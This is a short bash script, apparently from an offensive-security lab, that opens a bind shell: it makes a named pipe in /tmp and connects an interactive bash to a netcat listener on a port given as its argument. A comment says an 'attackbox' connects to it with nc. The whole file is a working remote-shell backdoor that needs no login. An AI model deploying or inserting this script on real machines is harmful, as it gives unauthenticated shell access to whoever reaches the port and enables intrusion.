#!/usr/bin/env bash

set -u

target_port=$1

# attackbox connects: nc [ip] [port]
mkfifo /tmp/f
/usr/bin/env bash -i </tmp/f 2>&1 | nc -l -p $target_port >/tmp/f
rm /tmp/f
